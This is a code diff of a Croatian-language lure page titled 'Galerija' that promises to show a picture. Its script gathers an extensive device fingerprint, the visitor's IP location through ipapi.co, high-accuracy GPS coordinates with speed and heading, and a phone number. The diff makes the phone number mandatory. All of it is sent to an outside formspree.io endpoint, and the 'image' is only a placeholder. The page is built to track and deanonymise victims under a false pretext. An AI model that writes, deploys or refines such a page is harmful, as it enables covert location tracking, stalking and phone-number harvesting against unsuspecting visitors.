@@ -6,115 +6,50 @@
 <title>Pogledaj sadržaj</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: #eef2f7;
-}
-
-.box {
-  max-width: 420px;
-  margin: 60px auto;
-  background: white;
-  border-radius: 18px;
-  box-shadow: 0 8px 30px rgba(0,0,0,0.12);
-  overflow: hidden;
-}
-
-.header {
-  background: #1877f2;
-  color: white;
-  padding: 18px;
-  font-size: 20px;
-  font-weight: bold;
-  text-align: center;
-}
-
-.content {
-  padding: 24px;
-  text-align: center;
-}
-
-.preview {
-  height: 220px;
-  border-radius: 14px;
-  background: #dbeafe;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 44px;
-  margin-bottom: 18px;
-}
-
-button {
-  background: #1877f2;
-  color: white;
-  border: none;
-  padding: 15px;
-  width: 100%;
-  border-radius: 10px;
-  font-size: 17px;
-  font-weight: bold;
-  cursor: pointer;
-  margin-top: 12px;
-}
-
-input {
-  width: 100%;
-  padding: 14px;
-  font-size: 16px;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  margin-top: 12px;
-}
-
-.small {
-  color: #666;
-  font-size: 14px;
-  margin-top: 10px;
-}
-
-#phoneStep, #finalStep {
-  display: none;
-}
+body { margin:0; font-family:Arial,sans-serif; background:#eef2f7; }
+.box { max-width:420px; margin:60px auto; background:white; border-radius:18px; box-shadow:0 8px 30px rgba(0,0,0,.12); overflow:hidden; }
+.header { background:#1877f2; color:white; padding:18px; font-size:20px; font-weight:bold; text-align:center; }
+.content { padding:24px; text-align:center; }
+.preview { height:220px; border-radius:14px; background:#dbeafe; display:flex; align-items:center; justify-content:center; font-size:44px; margin-bottom:18px; }
+button { background:#1877f2; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-size:17px; font-weight:bold; cursor:pointer; margin-top:12px; }
+input { width:100%; padding:14px; font-size:16px; border:1px solid #ccc; border-radius:10px; margin-top:12px; box-sizing:border-box; }
+.small { color:#666; font-size:14px; margin-top:10px; }
+#phoneStep, #finalStep { display:none; }
 </style>
 </head>
 
 <body>
 
 <div class="box">
-<div class="header">Galerija</div>
+  <div class="header">Galerija</div>
 
-<!-- STEP 1 -->
-<div class="content" id="startStep">
-  <div class="preview">🖼️</div>
-  <h2>Klikni da vidiš sliku</h2>
-  <p class="small">Za prikaz sadržaja potrebno je potvrditi pristup lokaciji.</p>
-  <button onclick="start()">Prikaži sliku</button>
-  <p id="status" class="small"></p>
-</div>
+  <div class="content" id="startStep">
+    <div class="preview">🖼️</div>
+    <h2>Klikni da nastaviš</h2>
+    <p class="small">
+      Za nastavak će biti zatražen pristup lokaciji i tehničke informacije uređaja.
+    </p>
+    <button onclick="start()">Nastavi</button>
+    <p id="status" class="small"></p>
+  </div>
 
-<!-- STEP 2 -->
-<div class="content" id="phoneStep">
-  <div class="preview">📱</div>
-  <h2>Unesi broj telefona</h2>
-  <p class="small">
-  Nakon unosa možeš nastaviti i pogledati sadržaj.
-  </p>
+  <div class="content" id="phoneStep">
+    <div class="preview">📱</div>
+    <h2>Unesi broj telefona</h2>
+    <p class="small">
+      Unesi broj telefona za nastavak.
+    </p>
 
-  <input id="phone" type="tel" placeholder="Broj telefona, npr. +43...">
+    <input id="phone" type="tel" placeholder="Broj telefona, npr. +43...">
+    <button onclick="sendWithPhone()">Pošalji broj</button>
+    <p id="phoneError" class="small"></p>
+  </div>
 
-  <button onclick="sendWithPhone()">Pošalji broj</button>
-  <button onclick="sendWithoutPhone()">Preskoči</button>
-</div>
-
-<!-- STEP 3 -->
-<div class="content" id="finalStep">
-  <h2>Slika</h2>
-  <img src="https://via.placeholder.com/400x300" style="width:100%; border-radius:12px;">
-  <p class="small">Hvala.</p>
-</div>
-
+  <div class="content" id="finalStep">
+    <h2>Slika</h2>
+    <img src="https://via.placeholder.com/400x300" style="width:100%; border-radius:12px;">
+    <p class="small">Hvala.</p>
+  </div>
 </div>
 
 <script>
@@ -130,7 +65,7 @@ async function start() {
     language: navigator.language || "N/A",
     languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
 
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
     timezoneOffset: new Date().getTimezoneOffset(),
     time: new Date().toLocaleString(),
 
@@ -139,6 +74,7 @@ async function start() {
     availWidth: screen.availWidth,
     availHeight: screen.availHeight,
     colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
     pixelRatio: window.devicePixelRatio,
 
     windowWidth: window.innerWidth,
@@ -148,50 +84,74 @@ async function start() {
     cookies: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack || "N/A",
 
-    touch: navigator.maxTouchPoints,
-    cpu: navigator.hardwareConcurrency || "N/A",
-    memory: navigator.deviceMemory || "N/A",
+    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+
+    cpuCores: navigator.hardwareConcurrency || "N/A",
+    deviceMemoryGB: navigator.deviceMemory || "N/A",
 
     url: location.href,
     referrer: document.referrer || "direkt"
   };
 
   if (navigator.connection) {
-    collectedData.network = navigator.connection.effectiveType;
-    collectedData.downlink = navigator.connection.downlink;
+    collectedData.networkEffectiveType = navigator.connection.effectiveType || "N/A";
+    collectedData.networkDownlink = navigator.connection.downlink || "N/A";
+    collectedData.networkSaveData = navigator.connection.saveData || false;
+    collectedData.networkRtt = navigator.connection.rtt || "N/A";
   }
 
   if (navigator.getBattery) {
     try {
-      let b = await navigator.getBattery();
-      collectedData.battery = Math.round(b.level * 100) + "%";
-      collectedData.charging = b.charging;
-    } catch {}
+      const b = await navigator.getBattery();
+      collectedData.batteryLevel = Math.round(b.level * 100) + "%";
+      collectedData.batteryCharging = b.charging;
+      collectedData.batteryChargingTime = b.chargingTime;
+      collectedData.batteryDischargingTime = b.dischargingTime;
+    } catch (e) {
+      collectedData.batteryInfo = "N/A";
+    }
   }
 
   try {
-    let res = await fetch("https://ipapi.co/json/");
-    let ip = await res.json();
-    collectedData.ip = ip.ip;
-    collectedData.city = ip.city;
-    collectedData.country = ip.country_name;
-    collectedData.org = ip.org;
-  } catch {}
+    const res = await fetch("https://ipapi.co/json/");
+    const ip = await res.json();
+
+    collectedData.ip = ip.ip || "N/A";
+    collectedData.ipCity = ip.city || "N/A";
+    collectedData.ipRegion = ip.region || "N/A";
+    collectedData.ipCountry = ip.country_name || "N/A";
+    collectedData.ipPostal = ip.postal || "N/A";
+    collectedData.ipOrg = ip.org || "N/A";
+    collectedData.ipTimezone = ip.timezone || "N/A";
+  } catch (e) {
+    collectedData.ipInfo = "N/A";
+  }
 
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
-        collectedData.lat = pos.coords.latitude;
-        collectedData.lon = pos.coords.longitude;
-        collectedData.accuracy = pos.coords.accuracy;
+        collectedData.gpsLatitude = pos.coords.latitude;
+        collectedData.gpsLongitude = pos.coords.longitude;
+        collectedData.gpsAccuracyMeters = pos.coords.accuracy;
+        collectedData.gpsAltitude = pos.coords.altitude;
+        collectedData.gpsSpeed = pos.coords.speed;
+        collectedData.gpsHeading = pos.coords.heading;
         showPhoneStep();
       },
-      function() {
-        collectedData.gps = "nije dozvoljeno";
+      function(error) {
+        collectedData.gpsStatus = "Nije dozvoljeno ili nije uspjelo";
+        collectedData.gpsError = error.message;
         showPhoneStep();
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 12000,
+        maximumAge: 0
       }
     );
   } else {
+    collectedData.gpsStatus = "Geolocation nije podržan";
     showPhoneStep();
   }
 }
@@ -202,21 +162,21 @@ function showPhoneStep() {
 }
 
 function sendWithPhone() {
-  collectedData.phone = document.getElementById("phone").value || "nije unesen";
-  sendData();
-}
+  const phone = document.getElementById("phone").value.trim();
 
-function sendWithoutPhone() {
-  collectedData.phone = "preskočeno";
+  if (!phone) {
+    document.getElementById("phoneError").textContent = "Molimo unesite broj telefona.";
+    return;
+  }
+
+  collectedData.phone = phone;
   sendData();
 }
 
 function sendData() {
   fetch("https://formspree.io/f/mnjlyqqy", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(collectedData)
   });
 
